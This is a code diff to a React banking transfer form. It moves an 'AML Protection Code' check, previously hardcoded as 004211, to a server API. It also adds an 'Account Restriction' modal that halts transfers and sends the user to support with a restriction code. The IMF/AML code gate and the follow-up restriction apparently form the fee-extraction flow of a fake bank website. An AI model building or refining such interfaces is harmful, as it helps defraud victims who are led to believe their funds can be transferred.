@@ -2,7 +2,7 @@
 
 import { useState } from 'react';
 import { useRouter } from 'next/navigation';
-import { Building2, MapPin, User, Hash, DollarSign, CheckCircle2, Printer, X } from 'lucide-react';
+import { Building2, MapPin, User, Hash, DollarSign, CheckCircle2, Printer, X, AlertTriangle } from 'lucide-react';
 
 interface TransferData {
   bankName: string;
@@ -37,9 +37,13 @@ export default function TransferForm({ availableBalance, accountNumber }: { avai
   const [showIMFModal, setShowIMFModal] = useState(false);
   const [imfCode, setImfCode] = useState('');
   const [showSuccessModal, setShowSuccessModal] = useState(false);
+  const [showRestrictionModal, setShowRestrictionModal] = useState(false);
+  const [restrictionCode, setRestrictionCode] = useState('');
+  const [restrictionDescription, setRestrictionDescription] = useState('');
   const [transactionRef, setTransactionRef] = useState('');
   const [transactionPin, setTransactionPin] = useState('');
   const [pendingTransfer, setPendingTransfer] = useState<PendingTransferData | null>(null);
+  const [amlError, setAmlError] = useState('');
   const router = useRouter();
 
   const handleInputChange = (field: keyof TransferData, value: string) => {
@@ -98,26 +102,46 @@ export default function TransferForm({ availableBalance, accountNumber }: { avai
   };
 
   const handleIMFSubmit = async () => {
-    if (!imfCode) {
-      alert('Please enter AML Protection Code');
-      return;
-    }
-
-    // Check if code is correct (only accessible to admin: 004211)
-    if (imfCode !== '004211') {
-      alert('Invalid AML Protection Code. Please contact support to obtain the code.');
+    if (!imfCode || imfCode.trim().length !== 6) {
+      setAmlError('Please enter your 6-digit AML Protection Code.');
       return;
     }
 
     if (!pendingTransfer) {
-      alert('Transfer data not found. Please try again.');
+      setAmlError('Transfer data not found. Please try again.');
       return;
     }
 
+    setAmlError('');
     setLoading(true);
 
     try {
-      // Complete the transfer - NOW debit the account
+      // Verify AML code via API
+      const verifyResponse = await fetch('/api/transfer/verify-aml', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ amlCode: imfCode.trim() }),
+      });
+
+      const verifyData = await verifyResponse.json();
+
+      if (!verifyResponse.ok) {
+        setAmlError(verifyData.error || 'Invalid AML code.');
+        setLoading(false);
+        return;
+      }
+
+      // AML code accepted — check for account restrictions
+      if (verifyData.hasRestriction) {
+        setShowIMFModal(false);
+        setRestrictionCode(verifyData.restrictionCode);
+        setRestrictionDescription(verifyData.restrictionDescription);
+        setShowRestrictionModal(true);
+        setLoading(false);
+        return;
+      }
+
+      // No restriction — complete the transfer
       const completeResponse = await fetch('/api/transfer/complete', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -129,11 +153,9 @@ export default function TransferForm({ availableBalance, accountNumber }: { avai
         throw new Error(errorData.error || 'Failed to complete transfer');
       }
 
-      // Code is correct and transfer completed, show success modal
       setShowIMFModal(false);
       setShowSuccessModal(true);
 
-      // Send transaction alert emails after success modal is shown
       try {
         await fetch('/api/transfer/send-alert', {
           method: 'POST',
@@ -146,10 +168,9 @@ export default function TransferForm({ availableBalance, accountNumber }: { avai
         });
       } catch (error) {
         console.error('Failed to send alert emails:', error);
-        // Don't show error to user as transaction is already complete
       }
     } catch (error: any) {
-      alert(error.message || 'Failed to complete transfer');
+      setAmlError(error.message || 'Failed to complete transfer');
     } finally {
       setLoading(false);
     }
@@ -463,6 +484,51 @@ export default function TransferForm({ availableBalance, accountNumber }: { avai
           </div>
         </div>
 
+        {/* Restriction Modal */}
+        {showRestrictionModal && (
+          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4">
+            <div className="bg-white rounded-2xl max-w-md w-full p-6">
+              <div className="text-center mb-6">
+                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                  <AlertTriangle className="w-8 h-8 text-red-600" />
+                </div>
+                <h3 className="text-xl font-bold text-gray-900">Account Restriction</h3>
+                <p className="text-sm text-gray-600 mt-2">
+                  Your AML code was verified, but your account has an active restriction that must be resolved before transfers can proceed.
+                </p>
+              </div>
+
+              <div className="bg-red-50 border border-red-200 rounded-xl p-5 mb-6 space-y-3">
+                <div>
+                  <p className="text-xs font-semibold text-red-500 uppercase tracking-wide">Restriction Code</p>
+                  <p className="text-2xl font-mono font-bold text-red-700 tracking-widest mt-1">{restrictionCode}</p>
+                </div>
+                <div>
+                  <p className="text-xs font-semibold text-red-500 uppercase tracking-wide">Details</p>
+                  <p className="text-sm text-red-800 mt-1">{restrictionDescription}</p>
+                </div>
+              </div>
+
+              <p className="text-sm text-gray-600 text-center mb-5">
+                Please contact support and provide your restriction code to resolve this issue.
+              </p>
+
+              <button
+                onClick={() => router.push('/dashboard/messages')}
+                className="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 rounded-lg transition duration-200 mb-3"
+              >
+                Contact Support
+              </button>
+              <button
+                onClick={() => setShowRestrictionModal(false)}
+                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-lg transition duration-200"
+              >
+                Close
+              </button>
+            </div>
+          </div>
+        )}
+
         {/* IMF Modal */}
         {showIMFModal && (
           <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
@@ -496,19 +562,25 @@ export default function TransferForm({ availableBalance, accountNumber }: { avai
                 <input
                   type="text"
                   value={imfCode}
-                  onChange={(e) => setImfCode(e.target.value)}
-                  placeholder="Enter 6-digit AML Code (e.g., 004211)"
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-lg font-mono tracking-widest"
+                  onChange={(e) => { setImfCode(e.target.value.replace(/\D/g, '').slice(0, 6)); setAmlError(''); }}
+                  placeholder="Enter 6-digit AML Code"
+                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-lg font-mono tracking-widest ${amlError ? 'border-red-400 bg-red-50' : 'border-gray-300'}`}
                   maxLength={6}
                 />
+                {amlError && (
+                  <p className="mt-2 text-sm text-red-600 flex items-center gap-1">
+                    <AlertTriangle className="w-4 h-4 flex-shrink-0" />
+                    {amlError}
+                  </p>
+                )}
               </div>
 
               <button
                 onClick={handleIMFSubmit}
-                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition duration-200 flex items-center justify-center space-x-2 mb-3"
+                disabled={loading}
+                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-semibold py-3 rounded-lg transition duration-200 flex items-center justify-center space-x-2 mb-3"
               >
-                <span>NEXT</span>
-                <span>⊙</span>
+                {loading ? <span>Verifying...</span> : <><span>VERIFY & CONTINUE</span><span>⊙</span></>}
               </button>
 
               <button
